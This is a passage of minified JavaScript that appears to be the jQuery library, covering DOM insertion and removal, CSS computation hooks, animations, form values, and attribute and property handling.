b=xb(this,a);b.appendChild(a)}})},prepend:function(){return this.domManip(arguments,function(a){if(1===this.nodeType||11===this.nodeType||9===this.nodeType){var b=xb(this,a);b.insertBefore(a,b.firstChild)}})},before:function(){return this.domManip(arguments,function(a){this.parentNode&&this.parentNode.insertBefore(a,this)})},after:function(){return this.domManip(arguments,function(a){this.parentNode&&this.parentNode.insertBefore(a,this.nextSibling)})},remove:function(a,b){for(var c,d=a?n.filter(a,this):this,e=0;null!=(c=d[e]);e++)b||1!==c.nodeType||n.cleanData(vb(c)),c.parentNode&&(b&&n.contains(c.ownerDocument,c)&&Ab(vb(c,"script")),c.parentNode.removeChild(c));return this},empty:function(){for(var a,b=0;null!=(a=this[b]);b++){1===a.nodeType&&n.cleanData(vb(a,!1));while(a.firstChild)a.removeChild(a.firstChild);a.options&&n.nodeName(a,"select")&&(a.options.length=0)}return this},clone:function(a,b){return a=null==a?!1:a,b=null==b?a:b,this.map(function(){return n.clone(this,a,b)})},html:function(a){return W(this,function(a){var b=this[0]||{},c=0,d=this.length;if(void 0===a)return 1===b.nodeType?b.innerHTML.replace(gb,""):void 0;if(!("string"!=typeof a||nb.test(a)||!l.htmlSerialize&&hb.test(a)||!l.leadingWhitespace&&ib.test(a)||sb[(kb.exec(a)||["",""])[1].toLowerCase()])){a=a.replace(jb,"<$1><$2>");try{for(;d>c;c++)b=this[c]||{},1===b.nodeType&&(n.cleanData(vb(b,!1)),b.innerHTML=a);b=0}catch(e){}}b&&this.empty().append(a)},null,a,arguments.length)},replaceWith:function(){var a=arguments[0];return this.domManip(arguments,function(b){a=this.parentNode,n.cleanData(vb(this)),a&&a.replaceChild(b,this)}),a&&(a.length||a.nodeType)?this:this.remove()},detach:function(a){return this.remove(a,!0)},domManip:function(a,b){a=e.apply([],a);var c,d,f,g,h,i,j=0,k=this.length,m=this,o=k-1,p=a[0],q=n.isFunction(p);if(q||k>1&&"string"==typeof p&&!l.checkClone&&ob.test(p))return this.each(function(c){var d=m.eq(c);q&&(a[0]=p.call(this,c,d.html())),d.domManip(a,b)});if(k&&(i=n.buildFragment(a,this[0].ownerDocument,!1,this),c=i.firstChild,1===i.childNodes.length&&(i=c),c)){for(g=n.map(vb(i,"script"),yb),f=g.length;k>j;j++)d=i,j!==o&&(d=n.clone(d,!0,!0),f&&n.merge(g,vb(d,"script"))),b.call(this[j],d,j);if(f)for(h=g[g.length-1].ownerDocument,n.map(g,zb),j=0;f>j;j++)d=g[j],pb.test(d.type||"")&&!n._data(d,"globalEval")&&n.contains(h,d)&&(d.src?n._evalUrl&&n._evalUrl(d.src):n.globalEval((d.text||d.textContent||d.innerHTML||"").replace(rb,"")));i=c=null}return this}}),n.each({appendTo:"append",prependTo:"prepend",insertBefore:"before",insertAfter:"after",replaceAll:"replaceWith"},function(a,b){n.fn[a]=function(a){for(var c,d=0,e=[],g=n(a),h=g.length-1;h>=d;d++)c=d===h?this:this.clone(!0),n(g[d])[b](c),f.apply(e,c.get());return this.pushStack(e)}});var Db,Eb={};function Fb(b,c){var d=n(c.createElement(b)).appendTo(c.body),e=a.getDefaultComputedStyle?a.getDefaultComputedStyle(d[0]).display:n.css(d[0],"display");return d.detach(),e}function Gb(a){var b=z,c=Eb[a];return c||(c=Fb(a,b),"none"!==c&&c||(Db=(Db||n("<iframe frameborder='0' width='0' height='0'/>")).appendTo(b.documentElement),b=(Db[0].contentWindow||Db[0].contentDocument).document,b.write(),b.close(),c=Fb(a,b),Db.detach()),Eb[a]=c),c}!function(){var a,b,c=z.createElement("div"),d="-webkit-box-sizing:content-box;-moz-box-sizing:content-box;box-sizing:content-box;display:block;padding:0;margin:0;border:0";c.innerHTML="  <link/><table></table><a href='/a'>a</a><input type='checkbox'/>",a=c.getElementsByTagName("a")[0],a.style.cssText="float:left;opacity:.5",l.opacity=/^0.5/.test(a.style.opacity),l.cssFloat=!!a.style.cssFloat,c.style.backgroundClip="content-box",c.cloneNode(!0).style.backgroundClip="",l.clearCloneStyle="content-box"===c.style.backgroundClip,a=c=null,l.shrinkWrapBlocks=function(){var a,c,e,f;if(null==b){if(a=z.getElementsByTagName("body")[0],!a)return;f="border:0;width:0;height:0;position:absolute;top:0;left:-9999px",c=z.createElement("div"),e=z.createElement("div"),a.appendChild(c).appendChild(e),b=!1,typeof e.style.zoom!==L&&(e.style.cssText=d+";width:1px;padding:1px;zoom:1",e.innerHTML="<div></div>",e.firstChild.style.width="5px",b=3!==e.offsetWidth),a.removeChild(c),a=c=e=null}return b}}();var Hb=/^margin/,Ib=new RegExp("^("+T+")(?!px)[a-z%]+$","i"),Jb,Kb,Lb=/^(top|right|bottom|left)$/;a.getComputedStyle?(Jb=function(a){return a.ownerDocument.defaultView.getComputedStyle(a,null)},Kb=function(a,b,c){var d,e,f,g,h=a.style;return c=c||Jb(a),g=c?c.getPropertyValue(b)||c[b]:void 0,c&&(""!==g||n.contains(a.ownerDocument,a)||(g=n.style(a,b)),Ib.test(g)&&Hb.test(b)&&(d=h.width,e=h.minWidth,f=h.maxWidth,h.minWidth=h.maxWidth=h.width=g,g=c.width,h.width=d,h.minWidth=e,h.maxWidth=f)),void 0===g?g:g+""}):z.documentElement.currentStyle&&(Jb=function(a){return a.currentStyle},Kb=function(a,b,c){var d,e,f,g,h=a.style;return c=c||Jb(a),g=c?c[b]:void 0,null==g&&h&&h[b]&&(g=h[b]),Ib.test(g)&&!Lb.test(b)&&(d=h.left,e=a.runtimeStyle,f=e&&e.left,f&&(e.left=a.currentStyle.left),h.left="fontSize"===b?"1em":g,g=h.pixelLeft+"px",h.left=d,f&&(e.left=f)),void 0===g?g:g+""||"auto"});function Mb(a,b){return{get:function(){var c=a();if(null!=c)return c?void delete this.get:(this.get=b).apply(this,arguments)}}}!function(){var b,c,d,e,f,g,h=z.createElement("div"),i="border:0;width:0;height:0;position:absolute;top:0;left:-9999px",j="-webkit-box-sizing:content-box;-moz-box-sizing:content-box;box-sizing:content-box;display:block;padding:0;margin:0;border:0";h.innerHTML="  <link/><table></table><a href='/a'>a</a><input type='checkbox'/>",b=h.getElementsByTagName("a")[0],b.style.cssText="float:left;opacity:.5",l.opacity=/^0.5/.test(b.style.opacity),l.cssFloat=!!b.style.cssFloat,h.style.backgroundClip="content-box",h.cloneNode(!0).style.backgroundClip="",l.clearCloneStyle="content-box"===h.style.backgroundClip,b=h=null,n.extend(l,{reliableHiddenOffsets:function(){if(null!=c)return c;var a,b,d,e=z.createElement("div"),f=z.getElementsByTagName("body")[0];if(f)return e.setAttribute("className","t"),e.innerHTML="  <link/><table></table><a href='/a'>a</a><input type='checkbox'/>",a=z.createElement("div"),a.style.cssText=i,f.appendChild(a).appendChild(e),e.innerHTML="<table><tr><td></td><td>t</td></tr></table>",b=e.getElementsByTagName("td"),b[0].style.cssText="padding:0;margin:0;border:0;display:none",d=0===b[0].offsetHeight,b[0].style.display="",b[1].style.display="none",c=d&&0===b[0].offsetHeight,f.removeChild(a),e=f=null,c},boxSizing:function(){return null==d&&k(),d},boxSizingReliable:function(){return null==e&&k(),e},pixelPosition:function(){return null==f&&k(),f},reliableMarginRight:function(){var b,c,d,e;if(null==g&&a.getComputedStyle){if(b=z.getElementsByTagName("body")[0],!b)return;c=z.createElement("div"),d=z.createElement("div"),c.style.cssText=i,b.appendChild(c).appendChild(d),e=d.appendChild(z.createElement("div")),e.style.cssText=d.style.cssText=j,e.style.marginRight=e.style.width="0",d.style.width="1px",g=!parseFloat((a.getComputedStyle(e,null)||{}).marginRight),b.removeChild(c)}return g}});function k(){var b,c,h=z.getElementsByTagName("body")[0];h&&(b=z.createElement("div"),c=z.createElement("div"),b.style.cssText=i,h.appendChild(b).appendChild(c),c.style.cssText="-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;position:absolute;display:block;padding:1px;border:1px;width:4px;margin-top:1%;top:1%",n.swap(h,null!=h.style.zoom?{zoom:1}:{},function(){d=4===c.offsetWidth}),e=!0,f=!1,g=!0,a.getComputedStyle&&(f="1%"!==(a.getComputedStyle(c,null)||{}).top,e="4px"===(a.getComputedStyle(c,null)||{width:"4px"}).width),h.removeChild(b),c=h=null)}}(),n.swap=function(a,b,c,d){var e,f,g={};for(f in b)g[f]=a.style[f],a.style[f]=b[f];e=c.apply(a,d||[]);for(f in b)a.style[f]=g[f];return e};var Nb=/alpha\([^)]*\)/i,Ob=/opacity\s*=\s*([^)]*)/,Pb=/^(none|table(?!-c[ea]).+)/,Qb=new RegExp("^("+T+")(.*)$","i"),Rb=new RegExp("^([+-])=("+T+")","i"),Sb={position:"absolute",visibility:"hidden",display:"block"},Tb={letterSpacing:0,fontWeight:400},Ub=["Webkit","O","Moz","ms"];function Vb(a,b){if(b in a)return b;var c=b.charAt(0).toUpperCase()+b.slice(1),d=b,e=Ub.length;while(e--)if(b=Ub[e]+c,b in a)return b;return d}function Wb(a,b){for(var c,d,e,f=[],g=0,h=a.length;h>g;g++)d=a[g],d.style&&(f[g]=n._data(d,"olddisplay"),c=d.style.display,b?(f[g]||"none"!==c||(d.style.display=""),""===d.style.display&&V(d)&&(f[g]=n._data(d,"olddisplay",Gb(d.nodeName)))):f[g]||(e=V(d),(c&&"none"!==c||!e)&&n._data(d,"olddisplay",e?c:n.css(d,"display"))));for(g=0;h>g;g++)d=a[g],d.style&&(b&&"none"!==d.style.display&&""!==d.style.display||(d.style.display=b?f[g]||"":"none"));return a}function Xb(a,b,c){var d=Qb.exec(b);return d?Math.max(0,d[1]-(c||0))+(d[2]||"px"):b}function Yb(a,b,c,d,e){for(var f=c===(d?"border":"content")?4:"width"===b?1:0,g=0;4>f;f+=2)"margin"===c&&(g+=n.css(a,c+U[f],!0,e)),d?("content"===c&&(g-=n.css(a,"padding"+U[f],!0,e)),"margin"!==c&&(g-=n.css(a,"border"+U[f]+"Width",!0,e))):(g+=n.css(a,"padding"+U[f],!0,e),"padding"!==c&&(g+=n.css(a,"border"+U[f]+"Width",!0,e)));return g}function Zb(a,b,c){var d=!0,e="width"===b?a.offsetWidth:a.offsetHeight,f=Jb(a),g=l.boxSizing()&&"border-box"===n.css(a,"boxSizing",!1,f);if(0>=e||null==e){if(e=Kb(a,b,f),(0>e||null==e)&&(e=a.style[b]),Ib.test(e))return e;d=g&&(l.boxSizingReliable()||e===a.style[b]),e=parseFloat(e)||0}return e+Yb(a,b,c||(g?"border":"content"),d,f)+"px"}n.extend({cssHooks:{opacity:{get:function(a,b){if(b){var c=Kb(a,"opacity");return""===c?"1":c}}}},cssNumber:{columnCount:!0,fillOpacity:!0,fontWeight:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,widows:!0,zIndex:!0,zoom:!0},cssProps:{"float":l.cssFloat?"cssFloat":"styleFloat"},style:function(a,b,c,d){if(a&&3!==a.nodeType&&8!==a.nodeType&&a.style){var e,f,g,h=n.camelCase(b),i=a.style;if(b=n.cssProps[h]||(n.cssProps[h]=Vb(i,h)),g=n.cssHooks[b]||n.cssHooks[h],void 0===c)return g&&"get"in g&&void 0!==(e=g.get(a,!1,d))?e:i[b];if(f=typeof c,"string"===f&&(e=Rb.exec(c))&&(c=(e[1]+1)*e[2]+parseFloat(n.css(a,b)),f="number"),null!=c&&c===c&&("number"!==f||n.cssNumber[h]||(c+="px"),l.clearCloneStyle||""!==c||0!==b.indexOf("background")||(i[b]="inherit"),!(g&&"set"in g&&void 0===(c=g.set(a,c,d)))))try{i[b]="",i[b]=c}catch(j){}}},css:function(a,b,c,d){var e,f,g,h=n.camelCase(b);return b=n.cssProps[h]||(n.cssProps[h]=Vb(a.style,h)),g=n.cssHooks[b]||n.cssHooks[h],g&&"get"in g&&(f=g.get(a,!0,c)),void 0===f&&(f=Kb(a,b,d)),"normal"===f&&b in Tb&&(f=Tb[b]),""===c||c?(e=parseFloat(f),c===!0||n.isNumeric(e)?e||0:f):f}}),n.each(["height","width"],function(a,b){n.cssHooks[b]={get:function(a,c,d){return c?0===a.offsetWidth&&Pb.test(n.css(a,"display"))?n.swap(a,Sb,function(){return Zb(a,b,d)}):Zb(a,b,d):void 0},set:function(a,c,d){var e=d&&Jb(a);return Xb(a,c,d?Yb(a,b,d,l.boxSizing()&&"border-box"===n.css(a,"boxSizing",!1,e),e):0)}}}),l.opacity||(n.cssHooks.opacity={get:function(a,b){return Ob.test((b&&a.currentStyle?a.currentStyle.filter:a.style.filter)||"")?.01*parseFloat(RegExp.$1)+"":b?"1":""},set:function(a,b){var c=a.style,d=a.currentStyle,e=n.isNumeric(b)?"alpha(opacity="+100*b+")":"",f=d&&d.filter||c.filter||"";c.zoom=1,(b>=1||""===b)&&""===n.trim(f.replace(Nb,""))&&c.removeAttribute&&(c.removeAttribute("filter"),""===b||d&&!d.filter)||(c.filter=Nb.test(f)?f.replace(Nb,e):f+" "+e)}}),n.cssHooks.marginRight=Mb(l.reliableMarginRight,function(a,b){return b?n.swap(a,{display:"inline-block"},Kb,[a,"marginRight"]):void 0}),n.each({margin:"",padding:"",border:"Width"},function(a,b){n.cssHooks[a+b]={expand:function(c){for(var d=0,e={},f="string"==typeof c?c.split(" "):[c];4>d;d++)e[a+U[d]+b]=f[d]||f[d-2]||f[0];return e}},Hb.test(a)||(n.cssHooks[a+b].set=Xb)}),n.fn.extend({css:function(a,b){return W(this,function(a,b,c){var d,e,f={},g=0;if(n.isArray(b)){for(d=Jb(a),e=b.length;e>g;g++)f[b[g]]=n.css(a,b[g],!1,d);return f}return void 0!==c?n.style(a,b,c):n.css(a,b)
},a,b,arguments.length>1)},show:function(){return Wb(this,!0)},hide:function(){return Wb(this)},toggle:function(a){return"boolean"==typeof a?a?this.show():this.hide():this.each(function(){V(this)?n(this).show():n(this).hide()})}});function $b(a,b,c,d,e){return new $b.prototype.init(a,b,c,d,e)}n.Tween=$b,$b.prototype={constructor:$b,init:function(a,b,c,d,e,f){this.elem=a,this.prop=c,this.easing=e||"swing",this.options=b,this.start=this.now=this.cur(),this.end=d,this.unit=f||(n.cssNumber[c]?"":"px")},cur:function(){var a=$b.propHooks[this.prop];return a&&a.get?a.get(this):$b.propHooks._default.get(this)},run:function(a){var b,c=$b.propHooks[this.prop];return this.pos=b=this.options.duration?n.easing[this.easing](a,this.options.duration*a,0,1,this.options.duration):a,this.now=(this.end-this.start)*b+this.start,this.options.step&&this.options.step.call(this.elem,this.now,this),c&&c.set?c.set(this):$b.propHooks._default.set(this),this}},$b.prototype.init.prototype=$b.prototype,$b.propHooks={_default:{get:function(a){var b;return null==a.elem[a.prop]||a.elem.style&&null!=a.elem.style[a.prop]?(b=n.css(a.elem,a.prop,""),b&&"auto"!==b?b:0):a.elem[a.prop]},set:function(a){n.fx.step[a.prop]?n.fx.step[a.prop](a):a.elem.style&&(null!=a.elem.style[n.cssProps[a.prop]]||n.cssHooks[a.prop])?n.style(a.elem,a.prop,a.now+a.unit):a.elem[a.prop]=a.now}}},$b.propHooks.scrollTop=$b.propHooks.scrollLeft={set:function(a){a.elem.nodeType&&a.elem.parentNode&&(a.elem[a.prop]=a.now)}},n.easing={linear:function(a){return a},swing:function(a){return.5-Math.cos(a*Math.PI)/2}},n.fx=$b.prototype.init,n.fx.step={};var _b,ac,bc=/^(?:toggle|show|hide)$/,cc=new RegExp("^(?:([+-])=|)("+T+")([a-z%]*)$","i"),dc=/queueHooks$/,ec=[jc],fc={"*":[function(a,b){var c=this.createTween(a,b),d=c.cur(),e=cc.exec(b),f=e&&e[3]||(n.cssNumber[a]?"":"px"),g=(n.cssNumber[a]||"px"!==f&&+d)&&cc.exec(n.css(c.elem,a)),h=1,i=20;if(g&&g[3]!==f){f=f||g[3],e=e||[],g=+d||1;do h=h||".5",g/=h,n.style(c.elem,a,g+f);while(h!==(h=c.cur()/d)&&1!==h&&--i)}return e&&(g=c.start=+g||+d||0,c.unit=f,c.end=e[1]?g+(e[1]+1)*e[2]:+e[2]),c}]};function gc(){return setTimeout(function(){_b=void 0}),_b=n.now()}function hc(a,b){var c,d={height:a},e=0;for(b=b?1:0;4>e;e+=2-b)c=U[e],d["margin"+c]=d["padding"+c]=a;return b&&(d.opacity=d.width=a),d}function ic(a,b,c){for(var d,e=(fc[b]||[]).concat(fc["*"]),f=0,g=e.length;g>f;f++)if(d=e[f].call(c,b,a))return d}function jc(a,b,c){var d,e,f,g,h,i,j,k,m=this,o={},p=a.style,q=a.nodeType&&V(a),r=n._data(a,"fxshow");c.queue||(h=n._queueHooks(a,"fx"),null==h.unqueued&&(h.unqueued=0,i=h.empty.fire,h.empty.fire=function(){h.unqueued||i()}),h.unqueued++,m.always(function(){m.always(function(){h.unqueued--,n.queue(a,"fx").length||h.empty.fire()})})),1===a.nodeType&&("height"in b||"width"in b)&&(c.overflow=[p.overflow,p.overflowX,p.overflowY],j=n.css(a,"display"),k=Gb(a.nodeName),"none"===j&&(j=k),"inline"===j&&"none"===n.css(a,"float")&&(l.inlineBlockNeedsLayout&&"inline"!==k?p.zoom=1:p.display="inline-block")),c.overflow&&(p.overflow="hidden",l.shrinkWrapBlocks()||m.always(function(){p.overflow=c.overflow[0],p.overflowX=c.overflow[1],p.overflowY=c.overflow[2]}));for(d in b)if(e=b[d],bc.exec(e)){if(delete b[d],f=f||"toggle"===e,e===(q?"hide":"show")){if("show"!==e||!r||void 0===r[d])continue;q=!0}o[d]=r&&r[d]||n.style(a,d)}if(!n.isEmptyObject(o)){r?"hidden"in r&&(q=r.hidden):r=n._data(a,"fxshow",{}),f&&(r.hidden=!q),q?n(a).show():m.done(function(){n(a).hide()}),m.done(function(){var b;n._removeData(a,"fxshow");for(b in o)n.style(a,b,o[b])});for(d in o)g=ic(q?r[d]:0,d,m),d in r||(r[d]=g.start,q&&(g.end=g.start,g.start="width"===d||"height"===d?1:0))}}function kc(a,b){var c,d,e,f,g;for(c in a)if(d=n.camelCase(c),e=b[d],f=a[c],n.isArray(f)&&(e=f[1],f=a[c]=f[0]),c!==d&&(a[d]=f,delete a[c]),g=n.cssHooks[d],g&&"expand"in g){f=g.expand(f),delete a[d];for(c in f)c in a||(a[c]=f[c],b[c]=e)}else b[d]=e}function lc(a,b,c){var d,e,f=0,g=ec.length,h=n.Deferred().always(function(){delete i.elem}),i=function(){if(e)return!1;for(var b=_b||gc(),c=Math.max(0,j.startTime+j.duration-b),d=c/j.duration||0,f=1-d,g=0,i=j.tweens.length;i>g;g++)j.tweens[g].run(f);return h.notifyWith(a,[j,f,c]),1>f&&i?c:(h.resolveWith(a,[j]),!1)},j=h.promise({elem:a,props:n.extend({},b),opts:n.extend(!0,{specialEasing:{}},c),originalProperties:b,originalOptions:c,startTime:_b||gc(),duration:c.duration,tweens:[],createTween:function(b,c){var d=n.Tween(a,j.opts,b,c,j.opts.specialEasing[b]||j.opts.easing);return j.tweens.push(d),d},stop:function(b){var c=0,d=b?j.tweens.length:0;if(e)return this;for(e=!0;d>c;c++)j.tweens[c].run(1);return b?h.resolveWith(a,[j,b]):h.rejectWith(a,[j,b]),this}}),k=j.props;for(kc(k,j.opts.specialEasing);g>f;f++)if(d=ec[f].call(j,a,k,j.opts))return d;return n.map(k,ic,j),n.isFunction(j.opts.start)&&j.opts.start.call(a,j),n.fx.timer(n.extend(i,{elem:a,anim:j,queue:j.opts.queue})),j.progress(j.opts.progress).done(j.opts.done,j.opts.complete).fail(j.opts.fail).always(j.opts.always)}n.Animation=n.extend(lc,{tweener:function(a,b){n.isFunction(a)?(b=a,a=["*"]):a=a.split(" ");for(var c,d=0,e=a.length;e>d;d++)c=a[d],fc[c]=fc[c]||[],fc[c].unshift(b)},prefilter:function(a,b){b?ec.unshift(a):ec.push(a)}}),n.speed=function(a,b,c){var d=a&&"object"==typeof a?n.extend({},a):{complete:c||!c&&b||n.isFunction(a)&&a,duration:a,easing:c&&b||b&&!n.isFunction(b)&&b};return d.duration=n.fx.off?0:"number"==typeof d.duration?d.duration:d.duration in n.fx.speeds?n.fx.speeds[d.duration]:n.fx.speeds._default,(null==d.queue||d.queue===!0)&&(d.queue="fx"),d.old=d.complete,d.complete=function(){n.isFunction(d.old)&&d.old.call(this),d.queue&&n.dequeue(this,d.queue)},d},n.fn.extend({fadeTo:function(a,b,c,d){return this.filter(V).css("opacity",0).show().end().animate({opacity:b},a,c,d)},animate:function(a,b,c,d){var e=n.isEmptyObject(a),f=n.speed(b,c,d),g=function(){var b=lc(this,n.extend({},a),f);(e||n._data(this,"finish"))&&b.stop(!0)};return g.finish=g,e||f.queue===!1?this.each(g):this.queue(f.queue,g)},stop:function(a,b,c){var d=function(a){var b=a.stop;delete a.stop,b(c)};return"string"!=typeof a&&(c=b,b=a,a=void 0),b&&a!==!1&&this.queue(a||"fx",[]),this.each(function(){var b=!0,e=null!=a&&a+"queueHooks",f=n.timers,g=n._data(this);if(e)g[e]&&g[e].stop&&d(g[e]);else for(e in g)g[e]&&g[e].stop&&dc.test(e)&&d(g[e]);for(e=f.length;e--;)f[e].elem!==this||null!=a&&f[e].queue!==a||(f[e].anim.stop(c),b=!1,f.splice(e,1));(b||!c)&&n.dequeue(this,a)})},finish:function(a){return a!==!1&&(a=a||"fx"),this.each(function(){var b,c=n._data(this),d=c[a+"queue"],e=c[a+"queueHooks"],f=n.timers,g=d?d.length:0;for(c.finish=!0,n.queue(this,a,[]),e&&e.stop&&e.stop.call(this,!0),b=f.length;b--;)f[b].elem===this&&f[b].queue===a&&(f[b].anim.stop(!0),f.splice(b,1));for(b=0;g>b;b++)d[b]&&d[b].finish&&d[b].finish.call(this);delete c.finish})}}),n.each(["toggle","show","hide"],function(a,b){var c=n.fn[b];n.fn[b]=function(a,d,e){return null==a||"boolean"==typeof a?c.apply(this,arguments):this.animate(hc(b,!0),a,d,e)}}),n.each({slideDown:hc("show"),slideUp:hc("hide"),slideToggle:hc("toggle"),fadeIn:{opacity:"show"},fadeOut:{opacity:"hide"},fadeToggle:{opacity:"toggle"}},function(a,b){n.fn[a]=function(a,c,d){return this.animate(b,a,c,d)}}),n.timers=[],n.fx.tick=function(){var a,b=n.timers,c=0;for(_b=n.now();c<b.length;c++)a=b[c],a()||b[c]!==a||b.splice(c--,1);b.length||n.fx.stop(),_b=void 0},n.fx.timer=function(a){n.timers.push(a),a()?n.fx.start():n.timers.pop()},n.fx.interval=13,n.fx.start=function(){ac||(ac=setInterval(n.fx.tick,n.fx.interval))},n.fx.stop=function(){clearInterval(ac),ac=null},n.fx.speeds={slow:600,fast:200,_default:400},n.fn.delay=function(a,b){return a=n.fx?n.fx.speeds[a]||a:a,b=b||"fx",this.queue(b,function(b,c){var d=setTimeout(b,a);c.stop=function(){clearTimeout(d)}})},function(){var a,b,c,d,e=z.createElement("div");e.setAttribute("className","t"),e.innerHTML="  <link/><table></table><a href='/a'>a</a><input type='checkbox'/>",a=e.getElementsByTagName("a")[0],c=z.createElement("select"),d=c.appendChild(z.createElement("option")),b=e.getElementsByTagName("input")[0],a.style.cssText="top:1px",l.getSetAttribute="t"!==e.className,l.style=/top/.test(a.getAttribute("style")),l.hrefNormalized="/a"===a.getAttribute("href"),l.checkOn=!!b.value,l.optSelected=d.selected,l.enctype=!!z.createElement("form").enctype,c.disabled=!0,l.optDisabled=!d.disabled,b=z.createElement("input"),b.setAttribute("value",""),l.input=""===b.getAttribute("value"),b.value="t",b.setAttribute("type","radio"),l.radioValue="t"===b.value,a=b=c=d=e=null}();var mc=/\r/g;n.fn.extend({val:function(a){var b,c,d,e=this[0];{if(arguments.length)return d=n.isFunction(a),this.each(function(c){var e;1===this.nodeType&&(e=d?a.call(this,c,n(this).val()):a,null==e?e="":"number"==typeof e?e+="":n.isArray(e)&&(e=n.map(e,function(a){return null==a?"":a+""})),b=n.valHooks[this.type]||n.valHooks[this.nodeName.toLowerCase()],b&&"set"in b&&void 0!==b.set(this,e,"value")||(this.value=e))});if(e)return b=n.valHooks[e.type]||n.valHooks[e.nodeName.toLowerCase()],b&&"get"in b&&void 0!==(c=b.get(e,"value"))?c:(c=e.value,"string"==typeof c?c.replace(mc,""):null==c?"":c)}}}),n.extend({valHooks:{option:{get:function(a){var b=n.find.attr(a,"value");return null!=b?b:n.text(a)}},select:{get:function(a){for(var b,c,d=a.options,e=a.selectedIndex,f="select-one"===a.type||0>e,g=f?null:[],h=f?e+1:d.length,i=0>e?h:f?e:0;h>i;i++)if(c=d[i],!(!c.selected&&i!==e||(l.optDisabled?c.disabled:null!==c.getAttribute("disabled"))||c.parentNode.disabled&&n.nodeName(c.parentNode,"optgroup"))){if(b=n(c).val(),f)return b;g.push(b)}return g},set:function(a,b){var c,d,e=a.options,f=n.makeArray(b),g=e.length;while(g--)if(d=e[g],n.inArray(n.valHooks.option.get(d),f)>=0)try{d.selected=c=!0}catch(h){d.scrollHeight}else d.selected=!1;return c||(a.selectedIndex=-1),e}}}}),n.each(["radio","checkbox"],function(){n.valHooks[this]={set:function(a,b){return n.isArray(b)?a.checked=n.inArray(n(a).val(),b)>=0:void 0}},l.checkOn||(n.valHooks[this].get=function(a){return null===a.getAttribute("value")?"on":a.value})});var nc,oc,pc=n.expr.attrHandle,qc=/^(?:checked|selected)$/i,rc=l.getSetAttribute,sc=l.input;n.fn.extend({attr:function(a,b){return W(this,n.attr,a,b,arguments.length>1)},removeAttr:function(a){return this.each(function(){n.removeAttr(this,a)})}}),n.extend({attr:function(a,b,c){var d,e,f=a.nodeType;if(a&&3!==f&&8!==f&&2!==f)return typeof a.getAttribute===L?n.prop(a,b,c):(1===f&&n.isXMLDoc(a)||(b=b.toLowerCase(),d=n.attrHooks[b]||(n.expr.match.bool.test(b)?oc:nc)),void 0===c?d&&"get"in d&&null!==(e=d.get(a,b))?e:(e=n.find.attr(a,b),null==e?void 0:e):null!==c?d&&"set"in d&&void 0!==(e=d.set(a,c,b))?e:(a.setAttribute(b,c+""),c):void n.removeAttr(a,b))},removeAttr:function(a,b){var c,d,e=0,f=b&&b.match(F);if(f&&1===a.nodeType)while(c=f[e++])d=n.propFix[c]||c,n.expr.match.bool.test(c)?sc&&rc||!qc.test(c)?a[d]=!1:a[n.camelCase("default-"+c)]=a[d]=!1:n.attr(a,c,""),a.removeAttribute(rc?c:d)},attrHooks:{type:{set:function(a,b){if(!l.radioValue&&"radio"===b&&n.nodeName(a,"input")){var c=a.value;return a.setAttribute("type",b),c&&(a.value=c),b}}}}}),oc={set:function(a,b,c){return b===!1?n.removeAttr(a,c):sc&&rc||!qc.test(c)?a.setAttribute(!rc&&n.propFix[c]||c,c):a[n.camelCase("default-"+c)]=a[c]=!0,c}},n.each(n.expr.match.bool.source.match(/\w+/g),function(a,b){var c=pc[b]||n.find.attr;pc[b]=sc&&rc||!qc.test(b)?function(a,b,d){var e,f;return d||(f=pc[b],pc[b]=e,e=null!=c(a,b,d)?b.toLowerCase():null,pc[b]=f),e}:function(a,b,c){return c?void 0:a[n.camelCase("default-"+b)]?b.toLowerCase():null}}),sc&&rc||(n.attrHooks.value={set:function(a,b,c){return n.nodeName(a,"input")?void(a.defaultValue=b):nc&&nc.set(a,b,c)}}),rc||(nc={set:function(a,b,c){var d=a.getAttributeNode(c);return d||a.setAttributeNode(d=a.ownerDocument.createAttribute(c)),d.value=b+="","value"===c||b===a.getAttribute(c)?b:void 0}},pc.id=pc.name=pc.coords=function(a,b,c){var d;return c?void 0:(d=a.getAttributeNode(b))&&""!==d.value?d.value:null},n.valHooks.button={get:function(a,b){var c=a.getAttributeNode(b);return c&&c.specified?c.value:void 0},set:nc.set},n.attrHooks.contenteditable={set:function(a,b,c){nc.set(a,""===b?!1:b,c)}},n.each(["width","height"],function(a,b){n.attrHooks[b]={set:function(a,c){return""===c?(a.setAttribute(b,"auto"),c):void 0}}})),l.style||(n.attrHooks.style={get:function(a){return a.style.cssText||void 0},set:function(a,b){return a.style.cssText=b+""}});var tc=/^(?:input|select|textarea|button|object)$/i,uc=/^(?:a|area)$/i;n.fn.extend({prop:function(a,b){return W(this,n.prop,a,b,arguments.length>1)},removeProp:function(a){return a=n.propFix[a]||a,this.each(function(){try{this[a]=void 0,delete this[a]}catch(b){}})}}),n.extend({propFix:{"for":"htmlFor","class":"className"},prop:function(a,b,c){var d,e,f,g=a.nodeType;if(a&&3!==g&&8!==g&&2!==g)return f=1!==g||!n.isXMLDoc(a),f&&(b=n.propFix[b]||b,e=n.propHooks[b]),void 0!==c?e&&"set"in e&&void 0!==(d=e.set(a,c,b))?d:a[b]=c:e&&"get"in e&&null!==(d=e.get(a,b))?d:a[b]},propHooks:{tabIndex:{get:function(a){var b=n.find.attr(a,"tabindex");return b?parseInt(b,10):tc.test(a.nodeName)||uc.test(a.nodeName)&&a.href?0:-1}}}}),l.hrefNormalized||n.each(["href","src"],function(a,b){n.propHooks[b]={get:function(a){return a.getAttribute(b,4)}}}),l.optSelected||(n.propHooks.selected={get:function(a){var b=a.parentNode;return b&&(b.selectedIndex,b.parentNode&&b.parentNode.selectedIndex),null}}),n.each(["tabIndex","readOnly","maxLength","cellSpacing","cellPadding","rowSpan","colSpan","useMap","frameBorder","contentEditable"],function(){n.propFix[this.toLowerCase()]=this}),l.enctype||(n.propFix.enctype="encoding");var vc=/[\t\r\n\f]/g;n.fn.extend({addClass:function(a){var b,c,d,e,f,g,h=0,i=this.length,j="string"==typeof a&&a;if(n.isFunction(a))return this.each(function(b){n(this).addClass(a.call(this,b,this.className))});if(j)for(b=(a||"").match(F)||[];i>h;h++)if(c=this[h],d=1===c.nodeType&&(c.className?(" "+c.className+" ").replace(vc," "):" ")){f=0;while(e=b[f++])d.indexOf(" "+e+" ")<0&&(d+=e+" ");g=n.trim(d),c.className!==g&&(c.className=g)}return this},removeClass:function(a){var b,c,d,e,f,g,h=0,i=this.length,j=0===arguments.length||"string"==typeof a&&a;if(n.isFunction(a))return 